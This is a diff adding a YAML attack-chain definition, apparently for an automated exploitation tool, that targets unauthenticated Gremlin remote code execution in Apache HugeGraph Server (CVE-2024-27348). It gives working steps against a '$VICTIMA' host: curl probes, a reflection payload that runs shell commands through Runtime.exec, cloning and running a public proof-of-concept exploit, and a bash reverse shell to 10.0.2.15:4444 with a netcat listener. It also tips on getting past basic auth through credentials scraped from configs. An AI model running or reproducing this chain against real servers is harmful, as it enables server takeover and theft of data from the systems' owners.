@@ -1,0 +1,61 @@
+chain_id: hugegraph_cve_2024_27348
+title: "Apache HugeGraph Server — CVE-2024-27348 unauthenticated Gremlin RCE"
+severity: CRITICAL
+tags: [hugegraph, apache, cve-2024-27348, rce, unauth, ognl, gremlin]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-27348" }
+    - { product_pattern: "(?i)hugegraph" }
+    - { banner_pattern: "(?i)hugegraph" }
+    - { port_in: [8080, 8081], path_pattern: "(?i)/apis/gremlin" }
+
+description: |
+  HugeGraph Server 1.0.0 to 1.2.x exposes /apis/gremlin to anyone
+  who can hit the port. The Gremlin query language is a thin
+  wrapper over the JVM, so a query that calls
+  `Thread.currentThread().getContextClassLoader().loadClass(...)`
+  ends up calling `Runtime.exec`. Patched in 1.3.0. Mass-scanned
+  since June 2024 by the same kits that hit Confluence and GitLab.
+
+steps:
+  - id: 1
+    title: "Confirm the API is live"
+    command: |
+      curl -sk "http://$VICTIMA:8080/apis/version" | head -3
+      curl -sk "http://$VICTIMA:8080/apis/graphs" | head -3
+
+  - id: 2
+    title: "Run `id` via the Gremlin endpoint"
+    command: |
+      curl -sk -X POST "http://$VICTIMA:8080/apis/gremlin" \
+        -H 'Content-Type: application/json' \
+        -d '{"gremlin":"Thread.currentThread().getContextClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(Thread.currentThread().getContextClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")"}'
+
+  - id: 3
+    title: "Public PoC — wrapper that prints command output cleanly"
+    command: |
+      git clone https://github.com/Zeyad-Azima/CVE-2024-27348 /tmp/hg27348
+      python3 /tmp/hg27348/exploit.py -u http://$VICTIMA:8080 -c "id; uname -a"
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      python3 /tmp/hg27348/exploit.py -u http://$VICTIMA:8080 \
+        -c "bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'"
+      nc -lvnp 4444
+
+common_errors:
+  - error: "200 OK but `Thread.currentThread()` returns access denied"
+    solution: |
+      1.3.0+ adds a SecurityManager that blocks reflection. Confirm
+      the version via `/apis/version` — if it is patched, the bug
+      is dead and you must move on.
+  - error: "endpoint behind nginx with auth header required"
+    solution: |
+      Some operators front HugeGraph with basic auth. Add `-u user:pass`
+      or look for `.htpasswd` / `auth.json` in scraped configs.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-27348
+  - https://lists.apache.org/thread/g1qlmdbfm77f7hgh10n9gl9gz1ydy0kr
